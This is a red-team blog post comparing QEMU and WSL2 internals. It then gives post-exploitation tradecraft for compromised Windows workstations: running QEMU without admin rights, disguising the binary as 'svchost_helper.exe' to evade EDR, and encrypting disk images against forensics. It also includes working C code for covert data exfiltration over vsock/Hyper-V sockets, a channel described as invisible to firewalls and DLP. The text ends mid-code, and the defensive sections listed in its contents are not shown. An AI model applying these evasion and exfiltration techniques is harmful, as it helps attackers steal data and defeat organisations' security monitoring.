---
title: "WSL2 & QEMU Experiments"
categories:
  - Blog
tags:
  - Windows
  - Red Team
---

## Table of Contents
 
1. [Introduction](#introduction)
2. [What Is QEMU?](#what-is-qemu)
   - [Architecture Overview](#architecture-overview)
   - [Emulation vs. Virtualization: The KVM Distinction](#emulation-vs-virtualization-the-kvm-distinction)
   - [QEMU Device Model and Backends](#qemu-device-model-and-backends)
   - [QEMU Networking Internals](#qemu-networking-internals)
3. [What Is WSL2?](#what-is-wsl2)
   - [Architecture Overview](#architecture-overview-1)
   - [The Lightweight Utility VM](#the-lightweight-utility-vm)
   - [9P and Plan 9 Filesystem Protocol](#9p-and-plan-9-filesystem-protocol)
   - [WSL2 Networking Internals](#wsl2-networking-internals)
4. [QEMU vs WSL2: A Deep Technical Comparison](#qemu-vs-wsl2-a-deep-technical-comparison)
   - [Hypervisor Layer](#hypervisor-layer)
   - [Filesystem Integration](#filesystem-integration)
   - [Networking Stack](#networking-stack)
   - [Attack Surface and Privilege Requirements](#attack-surface-and-privilege-requirements)
   - [Comparison Summary Table](#comparison-summary-table)
5. [Installing QEMU Without Administrator Privileges on Windows](#installing-qemu-without-administrator-privileges-on-windows)
   - [Why Non-Admin QEMU Matters for Red Teams](#why-non-admin-qemu-matters-for-red-teams)
   - [Method 1 — Portable QEMU Binary Extraction](#method-1--portable-qemu-binary-extraction)
   - [Method 2 — MSYS2 User-Space Installation](#method-2--msys2-user-space-installation)
   - [Method 3 — WSL2-Hosted QEMU (Nested)](#method-3--wsl2-hosted-qemu-nested)
   - [Operational Constraints and OPSEC Considerations](#operational-constraints-and-opsec-considerations)
6. [Covert Data Exfiltration via Host-to-Guest Channels](#covert-data-exfiltration-via-host-to-guest-channels)
   - [The Threat Model](#the-threat-model)
   - [vsock: Exfiltration from Windows Host to WSL2](#vsock-exfiltration-from-windows-host-to-wsl2)
   - [Named Pipes and virtio-serial: Exfiltration to QEMU Guests](#named-pipes-and-virtio-serial-exfiltration-to-qemu-guests)
   - [Comparative Analysis: vsock vs virtio-serial](#comparative-analysis-vsock-vs-virtio-serial)
7. [Detection Opportunities](#detection-opportunities)
8. [Defensive Recommendations](#defensive-recommendations)
9. [Conclusion](#conclusion)
 
---
 
## Introduction
 
Virtualization technology sits at an interesting intersection for offensive security practitioners. On one hand, virtualized environments are the bedrock of modern malware analysis, red team infrastructure, and lab work. On the other, the communication channels that connect virtual machines to their hosts — channels designed for performance and convenience — create covert data transfer surfaces that bypass traditional network-based monitoring entirely.
 
This post examines two very different approaches to running Linux workloads on Windows: **QEMU**, a general-purpose open-source emulator and hypervisor, and **WSL2** (Windows Subsystem for Linux 2), Microsoft's tightly integrated Linux-in-Windows solution. We will cover their internal architectures in depth, compare them across the dimensions that matter for security research, and then explore two practical offensive scenarios:
 
- **Installing QEMU on a compromised Windows host without administrator privileges** — a relevant problem when operating on locked-down corporate workstations where you need a controllable Linux environment but lack elevation.
- **Exfiltrating data across host-to-guest boundaries** using `vsock` for WSL2 and the `virtio-serial`/named pipe backend for QEMU — two mechanisms that operate entirely below the network layer, invisible to firewalls, NIDS, and most EDR telemetry.
 
---
 
## What Is QEMU?
 
QEMU (Quick EMUlator) is an open-source machine emulator and virtualizer originally written by Fabrice Bellard in 2003. It occupies a unique position in the virtualization landscape: it can operate in two fundamentally different modes that have radically different performance and security characteristics.
 
In its **emulation mode**, QEMU implements a complete virtual CPU through a technique called **Dynamic Binary Translation (DBT)** — guest machine instructions are translated on-the-fly into host machine instructions using QEMU's Tiny Code Generator (TCG). This allows QEMU to emulate architectures entirely foreign to the host: you can run an ARM binary on an x86 host, an RISC-V kernel on an AMD64 workstation, or a MIPS router firmware image on a macOS laptop. The performance cost of this translation is significant — typically 5–20× slower than native execution — but the flexibility is unparalleled.
 
In its **virtualization mode** (using hardware-assisted virtualization via KVM on Linux, HVF on macOS, or WHPX on Windows), QEMU runs guest code natively on the host CPU, delegating the CPU virtualization entirely to the hypervisor. In this mode, QEMU's role is reduced to managing virtual devices — network cards, storage controllers, display adapters — while the guest OS runs at near-native speed.
 
### Architecture Overview
 
QEMU's internal architecture is organized around several key components:
 
```
┌────────────────────────────────────────────────────────────────────┐
│                          QEMU Process                              │
│                                                                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐ │
│  │    TCG/KVM   │  │  Device Model│  │    Monitor / QMP         │ │
│  │  CPU Backend │  │   (virtio,   │  │  (Management Interface)  │ │
│  │              │  │   e1000,     │  │                          │ │
│  │  Guest vCPUs │  │   VGA, USB)  │  │  Unix socket / TCP       │ │
│  └──────────────┘  └──────────────┘  └──────────────────────────┘ │
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │                    I/O Thread(s)                              │ │
│  │  Handles device emulation, network I/O, storage I/O          │ │
│  └──────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────┘
         │                    │                    │
    KVM/WHPX/HVF         Host filesystem     Host network
    (kernel module)       (disk images)       (TAP/user)
```
 
The key architectural insight is that **QEMU is a user-space process**. It runs as a normal application on the host OS. Its guest runs inside that process (or with kernel acceleration via a hypervisor module). This has profound security implications: QEMU requires no special privileges to run in TCG mode, it is subject to the same sandboxing and monitoring as any other user-space process, and it can be killed, inspected, or manipulated by host OS tools with no more difficulty than any other application.
 
### Emulation vs. Virtualization: The KVM Distinction
 
The distinction between TCG emulation and hardware-accelerated virtualization matters significantly for performance but less so for the security topics we will cover:
 
**TCG (Tiny Code Generator) mode:**
- Pure software translation — no kernel module required
- Works as a completely unprivileged user-space process
- Any target architecture can be emulated on any host architecture
- ~5–20× performance penalty
- All I/O goes through QEMU's device model running in the same process
 
**Hardware-accelerated mode (KVM/WHPX/HVF):**
- Requires a kernel module (KVM on Linux) or OS-provided hypervisor (WHPX on Windows, HVF on macOS)
- Guest CPU executes natively — exits to QEMU only for I/O and privileged operations
- Near-native CPU performance (typically 2–5% overhead)
- Still requires QEMU for device emulation — all virtio/network/storage still goes through the QEMU user-space process
 
For the non-admin QEMU installation scenario later in this post, the TCG mode is what makes the technique viable: **x86 QEMU running in TCG mode on Windows requires zero administrative privileges**.
 
### QEMU Device Model and Backends
 
QEMU's device model is a layered abstraction system that separates the **frontend** (what the guest sees) from the **backend** (how the host implements it):
 
```
Guest OS                    QEMU Device Model             Host OS
─────────────────────────────────────────────────────────────────
VirtIO NIC driver  ←────→   virtio-net frontend  ←────→  TAP device
VirtIO SCSI driver ←────→   virtio-scsi frontend ←────→  Raw file / block device
Serial port driver ←────→   virtio-serial front  ←────→  Unix socket / Named pipe
```
 
This backend flexibility is central to our exfiltration discussion. The **virtio-serial** device presents itself to the guest as a standard serial port or character device, but its backend can be a Unix socket, a TCP connection, or — critically for Windows — a **Named Pipe**. This means data written to `/dev/vportXpY` inside a QEMU guest flows directly to a named pipe handle on the Windows host, completely bypassing the network stack.
 
### QEMU Networking Internals
 
QEMU supports multiple networking modes, each with different host privilege requirements and security profiles:
 
**User-mode networking (SLIRP):**
QEMU implements a user-space TCP/IP stack (derived from the SLIRP library). Guest network traffic is handled entirely within the QEMU process — no host network interfaces, no TAP devices, no root access required. The guest can reach the host network via NAT, but the host cannot initiate connections to the guest without explicit port forwarding configured at QEMU startup.
 
```bash
# User-mode networking — zero privileges required
qemu-system-x86_64 -netdev user,id=n1,hostfwd=tcp::2222-:22 -device virtio-net,netdev=n1
```
 
**TAP networking:**
A TAP virtual network interface is created on the host, bridged to a physical or virtual interface. The guest gets a full network stack with a real IP address on the host network segment. This requires root/administrator privileges to create TAP devices.
 
**Socket networking:**
QEMU can connect two VM instances via a TCP or UDP socket connection. No host privileges required, but no external network access.
 
The user-mode SLIRP networking is what makes unprivileged QEMU particularly interesting: a fully functional Linux VM with internet access, running as an unprivileged user process, with no visible network interfaces on the host.
 
---
 
## What Is WSL2?
 
Windows Subsystem for Linux 2 is Microsoft's second-generation Linux compatibility layer for Windows 10 and Windows 11. Unlike its predecessor (WSL1), which implemented a Linux syscall translation layer on top of the Windows kernel, WSL2 runs a **genuine Linux kernel** inside a lightweight virtual machine managed by the Windows Hyper-V hypervisor.
 
WSL2 is architecturally more honest than WSL1: rather than translating Linux syscalls into NT syscalls (a fundamentally leaky abstraction that broke many Linux applications), it runs an actual Linux kernel from which a genuine Linux environment operates. The trade-off is additional complexity in the host-to-guest integration layer.
 
### Architecture Overview
 
```
┌──────────────────────────────────────────────────────────────────┐
│                      Windows 10/11 Host                          │
│                                                                  │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │              Hyper-V Hypervisor (ring -1)                │   │
│   │                                                          │   │
│   │   ┌────────────────────┐   ┌──────────────────────────┐ │   │
│   │   │   Windows NT       │   │   WSL2 Utility VM        │ │   │
│   │   │   (root partition) │   │   (child partition)      │ │   │
│   │   │                    │   │                          │ │   │
│   │   │  Win32 apps        │   │  Linux kernel 5.15+      │ │   │
│   │   │  NT kernel         │   │  GNU userland            │ │   │
│   │   │  NTFS, Registry    │   │  ext4 VHD                │ │   │
│   │   └────────────────────┘   └──────────────────────────┘ │   │
│   │              │                         │                  │   │
│   │              └─────────┬───────────────┘                  │   │
│   │                        │  VMBus (Virtual Machine Bus)      │   │
│   └────────────────────────┼──────────────────────────────────┘   │
│                            │                                      │
│         Plan 9 / 9P (filesystem), vsock (communication),         │
│         virtio-net (networking), Hyper-V sockets                 │
└──────────────────────────────────────────────────────────────────┘
```
 
### The Lightweight Utility VM
 
WSL2 does not run a full desktop VM. Microsoft uses a heavily customized, minimal VM configuration called the **Lightweight Utility VM (LxUtilityVM)** — managed by the `LxssManager` service running in Windows. Key characteristics:
 
- **Shared kernel**: All WSL2 distributions running simultaneously share a single Linux kernel instance (though this is changing with per-distribution VMs in newer builds)
- **Memory ballooning**: The utility VM dynamically grows and shrinks its memory allocation based on Linux workload demands, up to a configurable maximum
- **Startup time**: The utility VM boots in ~1–2 seconds due to its minimal configuration
- **Process model**: Each WSL2 process maps to a Linux process inside the VM, but is also visible to Windows as a process under `wsl.exe`/`vmmem`
 
The `vmmem` process visible in Windows Task Manager is the memory reservation for the entire WSL2 utility VM — it grows as Linux workloads demand more memory and (eventually) shrinks when memory is released.
 
### 9P and Plan 9 Filesystem Protocol
 
One of the most architecturally interesting aspects of WSL2 is how Windows filesystem paths (`C:\`, `D:\`, UNC paths) are made accessible inside the Linux environment.
 
WSL2 uses the **Plan 9 Filesystem Protocol (9P)** over VMBus to expose Windows host directories to the Linux guest. A 9P server runs in the Windows host partition; the Linux kernel's 9P client mounts it at `/mnt/c`, `/mnt/d`, etc.
 
This means that accessing `C:\Windows\System32` from inside WSL2 involves:
 
```
WSL2 Linux process
    → read("/mnt/c/Windows/System32/...")
    → Linux 9P client
    → VMBus transport
    → Windows 9P server (in host NT kernel)
    → NTFS
```
 
The security implications are notable: Windows files accessed through the 9P mount are subject to Windows ACL enforcement (the 9P server checks the WSL process's Windows token), but the round-trip has historically been a source of TOCTOU vulnerabilities and permission mapping edge cases.
 
### WSL2 Networking Internals
 
WSL2 uses a **virtual Ethernet adapter** (a `vEthernet (WSL)` interface visible in Windows) to connect the Linux utility VM to the Windows host network. By default, WSL2 gets a private IP address (in the `172.x.x.x` range) that NATs through the Windows host.
 
The WSL2 networking model has evolved across Windows versions:
 
**Default NAT mode (pre-Windows 11 22H2):**
- WSL2 gets a private IP on a virtual switch managed by Hyper-V
- Windows host and WSL2 can communicate via this virtual IP
- External hosts cannot directly reach WSL2 services without port forwarding via `netsh interface portproxy`
- The virtual switch and IP address change on every WSL2 restart
 
**Mirrored networking mode (Windows 11 22H2+):**
- With `networkingMode=mirrored` in `.wslconfig`, WSL2 mirrors the host's network interfaces
- WSL2 gets the same IP as the Windows host
- No NAT — direct host-to-WSL2 and external-to-WSL2 connectivity
- Loopback (`127.0.0.1`) on Windows is accessible from WSL2 and vice versa
 
Beyond IP networking, WSL2 supports **Hyper-V sockets (hvsock)** — a socket address family (`AF_HYPERV`) that allows direct communication between the Windows host and the WSL2 guest without involving the TCP/IP stack. This is the foundation of the vsock exfiltration technique we will cover later.
 
---
 
## QEMU vs WSL2: A Deep Technical Comparison
 
With both systems' architectures understood, we can compare them across the dimensions that matter most for security research and offensive operations.
 
### Hypervisor Layer
 
**WSL2** sits on top of Hyper-V, which is Microsoft's Type-1 hypervisor. Hyper-V runs at a privilege level below the Windows NT kernel itself (ring -1, or VMX root mode). The Windows NT kernel runs as the "root partition" — a privileged VM with direct hardware access. WSL2's Linux VM runs as a "child partition" — a guest with no direct hardware access, fully mediated by the hypervisor.
 
Consequence: WSL2 requires Hyper-V to be enabled, which requires administrator privileges during setup and means the host is running a Type-1 hypervisor constantly. On systems where Hyper-V must be disabled (due to conflicts with third-party hypervisors), WSL2 cannot run.
 
**QEMU** in TCG mode is a pure user-space application. It implements its own CPU emulation without any kernel-level component. In accelerated mode on Windows, QEMU uses **WHPX (Windows Hypervisor Platform)** — a user-space API exposed by the Windows hypervisor that allows third-party VMMs to use hardware virtualization without kernel drivers. WHPX requires Hyper-V to be enabled (same dependency as WSL2) but exposes it to user-space applications.
 
In TCG mode with no acceleration: QEMU has zero kernel-level dependencies. It runs identically to any other Win32 application.
 
### Filesystem Integration
 
**WSL2** provides seamless bidirectional filesystem access:
- Windows paths available inside Linux at `/mnt/c`, `/mnt/d`, etc. (via 9P over VMBus)
- Linux ext4 filesystem stored as a VHD at `%LOCALAPPDATA%\Packages\<distro>\LocalState\ext4.vhdx`
- Windows can access Linux filesystem files via `\\wsl$\<distro>\` UNC path (also 9P-based)
- File permission mapping between Windows ACLs and Linux Unix permissions is handled (imperfectly) by the 9P server
 
**QEMU** provides no automatic filesystem integration. Host-to-guest filesystem sharing requires explicit configuration of one of:
- `virtio-9p` (same 9P protocol, but QEMU implements the server): `fsdev` backend + `virtio-9p-pci` device
- `virtio-fs` (virtiofs): higher-performance alternative using DAX mapping, requires `virtiofsd` daemon
- SAMBA/NFS shares over the user-mode network
- SFTP over the user-mode network with SSH
 
For red team use cases, `virtio-9p` over a named pipe backend gives a clean host-to-guest filesystem bridge with no network traffic.
 
### Networking Stack
 
| Feature | WSL2 | QEMU (user-mode) | QEMU (TAP) |
|---------|------|-----------------|-----------|
| Host privileges required | Admin (setup only) | None | Root/Admin |
| Guest gets real IP | Yes (virtual switch) | No (NAT/SLIRP) | Yes (bridged) |
| Host can reach guest ports | Via virtual IP | Via port forwarding | Direct |
| Network visible to host OS | vEthernet (WSL) adapter | Nothing | TAP interface |
| Guest can reach internet | Yes (NAT) | Yes (SLIRP NAT) | Yes |
| Inter-VM communication | Via IP | Via socket networking | Via bridge |
 
From a network visibility standpoint, **QEMU in user-mode networking is the stealthiest option** — no network interfaces appear on the host, no MAC addresses, no DHCP requests. All guest traffic flows through the QEMU process's standard socket connections.
 
### Attack Surface and Privilege Requirements
 
**WSL2:**
- Requires Hyper-V enabled (admin, one-time)
- Requires WSL2 feature enabled (admin, one-time)
- Running distributions: no admin required once enabled
- Significant attack surface: LxssManager service, 9P server, vsock bridge, Hyper-V integration components
- All running in a well-tested, Microsoft-maintained codebase
 
**QEMU:**
- TCG mode: zero privilege requirements
- WHPX mode: Hyper-V must be enabled (admin), but QEMU itself runs unprivileged
- KVM mode (Linux host): `/dev/kvm` access typically requires `kvm` group membership
- Attack surface: entirely within the QEMU user-space process — no kernel drivers in TCG mode
- QEMU's device model has historically had many vulnerabilities (vm-escape bugs), but these require the guest to exploit the host via device emulation
 
### Comparison Summary Table
 
| Dimension | WSL2 | QEMU (TCG) | QEMU (WHPX) |
|-----------|------|-----------|------------|
| **Architecture** | Type-1 Hyper-V guest | User-space emulation | User-space + Hyper-V API |
| **Admin required (setup)** | Yes | No | No (Hyper-V already enabled) |
| **Admin required (runtime)** | No | No | No |
| **CPU performance** | Near-native | 5–20× slower | Near-native |
| **Multi-arch support** | x86_64 only | Any → Any | x86_64 only |
| **Filesystem integration** | Automatic (9P) | Manual (virtio-9p) | Manual |
| **Networking** | NAT via virtual switch | NAT via SLIRP | NAT via SLIRP |
| **Network visibility** | vEthernet adapter visible | Nothing visible | Nothing visible |
| **Inter-process channels** | vsock / AF_HYPERV | virtio-serial / named pipe | virtio-serial / named pipe |
| **Kernel version** | Microsoft-provided 5.15+ | Any kernel in disk image | Any kernel in disk image |
| **Windows integration** | Deep (LxssManager, wslg) | None by default | None by default |
| **Ideal for red team** | Installed target environment | Controlled implant environment | Fast implant with existing Hyper-V |
| **EDR visibility** | wsl.exe, vmmem processes | Single QEMU process + image | Single QEMU process + image |
 
---
 
## Installing QEMU Without Administrator Privileges on Windows
 
### Why Non-Admin QEMU Matters for Red Teams
 
Consider a common post-exploitation scenario: you have code execution on a Windows workstation in a corporate environment. The user is a standard domain user — no local administrator rights, no ability to install services, no ability to load kernel drivers. You need a controlled Linux environment for several reasons:
 
- Running Linux-only tooling (custom implants, specific exploit code)
- Establishing a pivot point inside the target's local network from a controlled OS image
- Exfiltrating data through a channel that avoids Windows-side monitoring
- Running an environment that presents a minimal footprint to host-based EDR
 
WSL2 requires administrator privileges to enable the Hyper-V feature and the WSL2 Windows component — a one-time setup that standard users cannot perform. If WSL2 is not already enabled on the target, it is not an option.
 
QEMU in TCG mode, however, requires **zero administrative privileges**. It is a set of portable executables that can be dropped in a user-writable directory (`%TEMP%`, `%APPDATA%`, a user-writable share) and run immediately. The challenge is obtaining the binaries without triggering installation routines that require admin rights.
 
### Method 1 — Portable QEMU Binary Extraction
 
The official QEMU Windows installer (from `qemu.org`) is an NSIS-based installer that writes to `C:\Program Files`. However, **NSIS installers are extractable without executing them**, using 7-Zip or the `/extract` flag. The extracted files are standalone portable binaries.
 
**Step 1: Download the official QEMU Windows installer**
 
```powershell
# Download to a user-writable location — no elevation required
$url = "https://qemu.weilnetz.de/w64/qemu-w64-setup-20240101.exe"
$dest = "$env:TEMP\qemu-setup.exe"
Invoke-WebRequest -Uri $url -OutFile $dest
```
 
**Step 2: Extract without installing**
 
NSIS installers support a `/extract` flag, or can be extracted with 7-Zip in silent mode. From a cmd or PowerShell prompt:
 
```cmd
:: Method A — NSIS self-extract (no 7-zip needed)
%TEMP%\qemu-setup.exe /extract %USERPROFILE%\qemu
 
:: Method B — 7-Zip extraction (if 7z is available)
7z x %TEMP%\qemu-setup.exe -o%USERPROFILE%\qemu -y
```
 
Both methods produce the QEMU binaries in the target directory with no registry writes, no service installation, and no UAC prompt.
 
**Step 3: Verify the extraction**
 
```powershell
$qemuDir = "$env:USERPROFILE\qemu"
Get-ChildItem $qemuDir -Filter "qemu-system-*.exe" | Select-Object Name, Length
```
 
You should see `qemu-system-x86_64.exe`, `qemu-system-aarch64.exe`, and other architecture-specific binaries along with shared DLLs.
 
**Step 4: Create a minimal disk image and launch**
 
```cmd
:: Create a 10GB disk image in user space
%USERPROFILE%\qemu\qemu-img.exe create -f qcow2 %TEMP%\vm.qcow2 10G
 
:: Boot from an ISO with user-mode networking — zero privileges
%USERPROFILE%\qemu\qemu-system-x86_64.exe ^
    -m 2048 ^
    -hda %TEMP%\vm.qcow2 ^
    -cdrom %TEMP%\linux.iso ^
    -netdev user,id=net0 ^
    -device virtio-net-pci,netdev=net0 ^
    -nographic ^
    -serial stdio
```
 
The `-nographic` flag disables the GUI window (important on headless servers or when operating covertly). `-serial stdio` connects the VM's serial console to the current terminal, giving you full console access to the guest without any GUI.
 
**Step 5: Headless operation with serial console access**
 
For a production implant scenario, you want the VM running in the background with no visible window and accessible via a stable channel. The `-monitor` option exposes QEMU's management interface:
 
```cmd
%USERPROFILE%\qemu\qemu-system-x86_64.exe ^
    -m 1024 ^
    -hda %TEMP%\vm.qcow2 ^
    -netdev user,id=net0,hostfwd=tcp:127.0.0.1:2222-:22 ^
    -device virtio-net-pci,netdev=net0 ^
    -nographic ^
    -monitor unix:%TEMP%\qemu-monitor.sock,server,nowait ^
    -daemonize
```
 
> ⚠️ Note: The `-daemonize` flag is Linux-only. On Windows, use `START /B` or a scheduled task to background the process.
 
### Method 2 — MSYS2 User-Space Installation
 
MSYS2 provides a Windows port of `pacman` (the Arch Linux package manager) and can be installed entirely in user space. QEMU is available in MSYS2's repositories and can be installed without administrator rights once MSYS2 itself is set up.
 
**Step 1: Install MSYS2 to a user-writable path**
 
```powershell
# Download MSYS2 self-extracting archive
$msys2Url = "https://github.com/msys2/msys2-installer/releases/latest/download/msys2-base-x86_64.sfx.exe"
Invoke-WebRequest -Uri $msys2Url -OutFile "$env:TEMP\msys2.exe"
 
# Extract to user profile — no admin required
Start-Process "$env:TEMP\msys2.exe" -ArgumentList "-y -o$env:USERPROFILE\msys2" -Wait
```
 
**Step 2: Initialize pacman and install QEMU**
 
```bash
# Inside MSYS2 shell
pacman -Syu --noconfirm
pacman -S mingw-w64-x86_64-qemu --noconfirm
```
 
QEMU is installed to `~/msys2/mingw64/bin/` — entirely within the user profile, no admin required.
 
**Advantage over Method 1:** MSYS2 provides a full package manager, allowing additional tools (`curl`, `python`, `socat`) to be installed alongside QEMU in the same user-space environment. This is useful for building more complete implant environments.
 
### Method 3 — WSL2-Hosted QEMU (Nested)
 
If WSL2 is already installed on the target (increasingly common in developer environments), QEMU can be installed inside the WSL2 Linux environment and used to run additional VMs — a nested virtualization setup.
 
```bash
# Inside WSL2 (Ubuntu)
sudo apt-get update
sudo apt-get install -y qemu-system-x86 qemu-utils
 
# Check if KVM is available (unlikely in WSL2, but possible on some builds)
ls /dev/kvm 2>/dev/null && echo "KVM available" || echo "TCG only"
 
# Launch a nested VM — falls back to TCG if KVM unavailable
qemu-system-x86_64 \
    -m 512 \
    -hda /tmp/nested.qcow2 \
    -netdev user,id=net0 \
    -device virtio-net,netdev=net0 \
    -nographic
```
 
The nested VM's network traffic will flow through WSL2's network stack and then through the Windows host's network stack. From a host monitoring perspective, the nested VM's traffic appears to originate from the WSL2 VM — another layer of indirection.
 
### Operational Constraints and OPSEC Considerations
 
Several constraints apply when operating QEMU without admin privileges that an operator must account for:
 
**Performance:** TCG emulation is slow. A complex Linux workload that would run in seconds natively may take minutes in TCG mode. For operational tasks requiring throughput (e.g., compiling implants inside the VM), this is a significant constraint. A pre-built disk image with all tools already installed is essential.
 
**Disk image placement:** The disk image file (`vm.qcow2`) will be created in a user-accessible path. Forensic investigation will find this file. Consider using `qcow2` format with encryption (`qemu-img create -f qcow2 -o encryption-format=luks,key-secret=...`) to protect the contents.
 
**Process visibility:** The QEMU process (`qemu-system-x86_64.exe`) will be visible in `tasklist`, Process Explorer, and EDR telemetry. The process name is distinctive. Consider renaming the binary before execution — QEMU does not check its own name:
 
```cmd
copy %USERPROFILE%\qemu\qemu-system-x86_64.exe %TEMP%\svchost_helper.exe
%TEMP%\svchost_helper.exe -m 1024 -hda %TEMP%\vm.qcow2 ...
```
 
**Network visibility:** User-mode SLIRP networking creates no host network interfaces. Guest traffic appears to the host as normal socket connections from the QEMU process. If the QEMU process is allowed outbound connectivity, the guest has outbound connectivity.
 
**File writes:** QEMU writes to the disk image on every guest write operation. The image file's modification timestamp is continuously updated. File system forensics will confirm a running VM was present.
 
**ETW telemetry:** The QEMU process will generate standard process creation events, image load events (for the QEMU DLLs), and network connection events (for SLIRP-initiated connections). It will not generate any kernel driver load events (no drivers in TCG mode) or elevated privilege events.
 
---
 
## Covert Data Exfiltration via Host-to-Guest Channels
 
### The Threat Model
 
The exfiltration scenario we are addressing is the following: an attacker has code execution on a Windows host (either directly or via a compromised process) and wants to transfer data into a controlled VM environment (either WSL2 or a QEMU guest) without that transfer being visible to network monitoring, DLP tools, or firewall rules.
 
Both WSL2 and QEMU provide host-to-guest communication channels that operate entirely below the network layer:
 
- **WSL2** provides `vsock` / `AF_VSOCK` (and the Windows-side equivalent `AF_HYPERV`) — a socket-like interface that connects the Windows host and the WSL2 Linux guest over VMBus, with no IP addressing involved.
- **QEMU** provides `virtio-serial` with a **Named Pipe** backend — a character device in the guest that maps to a Windows named pipe on the host, again with no IP addressing.
 
Both channels are invisible to:
- Firewall rules (they operate below the IP stack)
- NIDS/NIPS (no network packets)
- DLP tools that inspect network traffic
- Most EDR network telemetry (which typically monitors at the socket/IP level)
 
They are potentially visible to:
- Process-level I/O monitoring (observing large write volumes to the pipe/socket handle)
- ETW providers monitoring file/pipe I/O (`Microsoft-Windows-Kernel-File`)
- Custom kernel drivers monitoring named pipe operations
 
### vsock: Exfiltration from Windows Host to WSL2
 
**vsock** is a Linux socket address family (`AF_VSOCK`, socket type `SOCK_STREAM`) designed specifically for hypervisor-to-VM communication. In the WSL2 context, vsock connections are backed by **Hyper-V sockets** (`AF_HYPERV`) on the Windows side — meaning the Windows host uses `AF_HYPERV` to connect to a `AF_VSOCK` listener in WSL2.
 
The vsock addressing model uses two components instead of an IP address and port:
- **CID (Context Identifier)**: identifies the VM. CID 2 is the host; WSL2 uses a specific CID visible in the registry.
- **Port**: a 32-bit unsigned integer
 
#### Setting Up a vsock Listener in WSL2
 
On the Linux (WSL2) side, the listener is straightforward POSIX socket code using `AF_VSOCK`:
 
```c
// vsock_server.c — runs inside WSL2
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>  // AF_VSOCK, struct sockaddr_vm
#include <fcntl.h>
 
#define VSOCK_PORT 9999
 
int main(int argc, char* argv[]) {
    const char* output_path = argc > 1 ? argv[1] : "/tmp/received_data";
    
    int server_fd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }
 
    struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
        .svm_cid    = VMADDR_CID_ANY,   // Accept from any CID
        .svm_port   = VSOCK_PORT,
    };
 
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }
 
    listen(server_fd, 5);
    printf("[*] vsock listener on port %u\n", VSOCK_PORT);
    printf("[*] Writing received data to: %s\n", output_path);
 
    // Accept incoming connection from Windows host
    struct sockaddr_vm client_addr;
    socklen_t client_len = sizeof(client_addr);
    int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
    if (client_fd < 0) {
        perror("accept");
        return 1;
    }
 
    printf("[+] Connection from CID %u\n", client_addr.svm_cid);
 
    // Open output file
    FILE* out = fopen(output_path, "wb");
    if (!out) {
        perror("fopen");
        return 1;
    }
 
    // Receive and write data
    char buf[65536];
    ssize_t n;
    size_t total = 0;
    while ((n = recv(client_fd, buf, sizeof(buf), 0)) > 0) {
        fwrite(buf, 1, n, out);
        total += n;
    }
 
    fclose(out);
    close(client_fd);
    close(server_fd);
 
    printf("[+] Received %zu bytes → %s\n", total, output_path);
    return 0;
}
```
 
Compile and run inside WSL2:
 
```bash
# Inside WSL2
gcc -o vsock_server vsock_server.c
./vsock_server /tmp/exfiltrated_data &
```
 
#### Finding the WSL2 VM ID on the Windows Side
 
The Windows `AF_HYPERV` socket needs the VM's GUID, not a CID number. This GUID is the Hyper-V VM ID assigned to the WSL2 utility VM. It changes between WSL2 sessions but can be retrieved from the registry:
 
```powershell
# Get the WSL2 VM ID from the Hyper-V VM database
# This requires the VM to be running
 
# Method 1 — Via Hyper-V WMI
Get-WmiObject -Namespace root\virtualization\v2 -Class Msvm_ComputerSystem |
    Where-Object { $_.ElementName -like "*lxss*" -or $_.ElementName -like "*WSL*" } |
    Select-Object ElementName, Name
 
# Method 2 — Via registry (more reliable)
$hklm = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
    [Microsoft.Win32.RegistryHive]::LocalMachine, 
    [Microsoft.Win32.RegistryView]::Registry64
)
$wslKey = $hklm.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss")
$wslKey.GetSubKeyNames() | ForEach-Object {
    $sub = $wslKey.OpenSubKey($_)
    [PSCustomObject]@{
        GUID        = $_
        DistroName  = $sub.GetValue("DistributionName")
        VmId        = $sub.GetValue("VmId")
    }
}
```
 
There is also a **well-known GUID for Hyper-V loopback** that allows connecting to any vsock listener in the root partition's child VMs:
 
```
HV_GUID_LOOPBACK = {e0e16197-dd56-4a10-9195-5ee7a155a838}
```
 
However, for WSL2 specifically, there is an even simpler approach: Windows Insider builds and recent stable builds expose a `AF_HYPERV` service ID that maps to the vsock port number via a fixed formula:
 
```
ServiceId = {<port_as_hex_32bit>-facb-11e6-bd58-64006a7986d3}
```
 
For port `9999` (`0x0000270F`):
```
ServiceId = {0000270f-facb-11e6-bd58-64006a7986d3}
```
 
#### Sending Data from Windows Host to WSL2 via AF_HYPERV
 
```c
// hvsock_client.c — runs on the Windows host
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <hvsocket.h>        // Hyper-V socket definitions
#include <initguid.h>
#include <stdio.h>
#include <stdlib.h>
 
#pragma comment(lib, "ws2_32.lib")
 
// ServiceId for vsock port 9999
// Formula: {PORT_HEX-facb-11e6-bd58-64006a7986d3}
DEFINE_GUID(VSOCK_SERVICE_GUID,
    0x0000270f, 0xfacb, 0x11e6,
    0xbd, 0x58, 0x64, 0x00, 0x6a, 0x79, 0x86, 0xd3);
 
// Well-known wildcard VM ID — connects to any child partition
// For WSL2, use the specific VM ID from registry for reliability
DEFINE_GUID(HV_GUID_WILDCARD,
    0x00000000, 0x0000, 0x0000,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);
 
int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"Usage: hvsock_client.exe <file_to_send>\n");
        return 1;
    }
 
    // Initialize Winsock
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
 
    // Create AF_HYPERV stream socket
    SOCKET sock = socket(AF_HYPERV, SOCK_STREAM, HV_PROTOCOL_RAW);
    if (sock == INVALID_SOCKET) {
